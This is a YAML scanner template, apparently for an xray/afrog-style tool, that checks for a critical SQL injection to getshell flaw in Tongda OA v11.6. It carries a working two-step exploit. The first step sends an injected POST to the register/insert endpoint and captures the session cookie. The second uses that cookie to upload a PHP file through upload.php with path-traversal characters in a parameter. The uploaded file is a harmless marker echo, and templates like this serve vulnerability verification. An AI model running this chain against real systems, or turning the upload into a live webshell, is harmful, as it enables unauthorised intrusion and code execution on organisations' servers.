expression: r0() && r1()
id: tongda-insert-sql-inject-getshell
info:
  author: zan8in
  description: "\u901A\u8FBEOA v11.6 insert\u53C2\u6570\u5305\u542BSQL\u6CE8\u5165\
    \u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u901A\u8FC7\u6F0F\u6D1E\u53EF\u83B7\u53D6\
    \u6570\u636E\u5E93\u654F\u611F\u4FE1\u606F\napp=\"TDXK-\u901A\u8FBEOA\"\n\u53D1\
    \u9001\u8BF7\u6C42\u5305\u5224\u65AD\u6F0F\u6D1E /general/document/index.php/recv/register/insert\
    \ \u8FD4\u56DE302\u5219\u662F\u5B58\u5728\u6F0F\u6D1E\uFF0C\u8FD4\u56DE500\u5219\
    \u4E0D\u5B58\u5728\n"
  name: "\u901A\u8FBEOA v11.6 insert SQL\u6CE8\u5165\u6F0F\u6D1E"
  reference:
  - http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.6%20insert%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
  - https://blog.csdn.net/weixin_39779975/article/details/111091529
  severity: critical
  verified: true
rules:
  r0:
    expression: response.status == 302 && response.headers["set-cookie"].contains("PHPSESSID=")
    output:
      mycookie: search["mycookie"]
      search: '"PHPSESSID=(?P<mycookie>.*?);".bsubmatch(response.raw_header)'
    request:
      body: 'title)values("''"^exp(if(ascii(substr(MOD(5,2),1,1))<128,1,710)))# =1&_SERVER=

        '
      method: POST
      path: /general/document/index.php/recv/register/insert
  r1:
    expression: response.body.bcontains(bytes(filename))
    request:
      body: "--WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
        \ name=\"FILE1\"; filename=\"{{filename}}\"\r\n\r\n<?php echo \"a1f1r1o1g1\"\
        ;?>\r\n--WebKitFormBoundary{{rboundary}}--\r\n"
      headers:
        Content-Type: multipart/form-data; boundary=WebKitFormBoundary{{rboundary}}
        Cookie: PHPSESSID={{mycookie}};_SERVER=
      method: POST
      path: /general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.%3C%3E./.%3C%3E./.%3C%3E./
set:
  filename: randomLowercase(8) + ".php"
  rboundary: randomLowercase(8)
